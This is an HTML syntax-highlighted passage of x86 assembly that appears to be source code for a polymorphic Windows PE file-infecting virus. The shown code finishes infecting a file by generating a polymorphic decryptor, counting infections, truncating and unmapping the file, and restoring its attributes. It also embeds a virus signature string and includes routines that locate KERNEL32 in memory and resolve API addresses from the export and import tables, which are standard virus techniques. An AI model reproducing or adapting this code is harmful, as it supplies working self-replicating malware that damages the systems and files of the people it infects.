    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">Align</span><span class="sc0">                           </span><span class="sc1">; by 4</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">LIMIT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME</span><span class="sc0">                            </span><span class="sc1">; generate the poly decryptor</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Trunc file</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">Align</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TruncFile</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">UnMapFile</span><span class="sc0">
</span><span class="sc5">NoInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Shit, if we are here, </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; something failed :(</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TruncFile</span><span class="sc0">

</span><span class="sc5">UnMapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Close map view of file</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">CloseMap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Close map handle</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Close file handle</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

</span><span class="sc5">CantOpen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Restore old attributes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc3">"[Welcome to the Middle-Earth, my dear friend]"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Tiny method for get KERNEL32 base address</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        ESI = Program return address</span><span class="sc0">
</span><span class="sc1">;        ECX = Limit of pages where search</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        EAX = Base address of KERNEL32.dll</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetK32</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">; My own little GetK32 :)</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc5">_@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">WeFailed</span><span class="sc0">                        </span><span class="sc1">; Thanx to Super for the idea</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">             </span><span class="sc1">; and Qozah for notifying me</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CheckPE</span><span class="sc0">                         </span><span class="sc1">; a little error (Thnx man!)</span><span class="sc0">
</span><span class="sc5">_@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_@1</span><span class="sc0">

</span><span class="sc5">CheckPE</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">WeGotK32</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">_@2</span><span class="sc0">
</span><span class="sc5">WeFailed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inNT</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Otherwise, hardcode to the</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">W9X</span><span class="sc0">                             </span><span class="sc1">; proper OS.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernel_wNT</span><span class="sc0">                  </span><span class="sc1">; NT = 77F00000h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">WeGotK32</span><span class="sc0">
</span><span class="sc5">W9X</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernel_</span><span class="sc0">                     </span><span class="sc1">; 9X = BFF70000h</span><span class="sc0">
</span><span class="sc5">WeGotK32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetK32</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Retrieve API addresses (from Export Table)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        EDI = Pointer to where you want the first API Address</span><span class="sc0">
</span><span class="sc1">;        ESI = Pointer to the first API Name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetAPIs</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI_ET</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">stosd</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@2</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0BBh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@1</span><span class="sc0">
</span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAPIs</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Retrieve API address (from Export Table)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        ESI = Pointer to API Name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        EAX = API address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetAPI_ET</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">@_1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@_1</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; EDI = API Name size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">
    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressTableVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; mov [NameTableVA],eax   =)</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OrdinalTableVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">@_3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@_4</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@_3</span><span class="sc0">

</span><span class="sc5">@_4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OrdinalTableVA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressTableVA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc5">rva2va</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">kernel</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAPI_ET</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Retrieve API address (from Import Table)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        EDI = Offset of API address to retrieve</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        EAX = Address of the API</span><span class="sc0">
</span><span class="sc1">;        EBX = Address of the API address in the import</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">GetAPI_IT</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempGA_IT1</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempGA_IT2</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nopes</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">7Ch</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    
</span><span class="sc5">SearchK32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32_DLL</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">K32_Size</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">gotcha</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SearchK32</span><span class="sc0">
</span><span class="sc5">gotcha</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nopes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nopes</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">loopy</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nopes</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">reloop</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempGA_IT1</span><span class="sc4">]</span><span class="sc0">
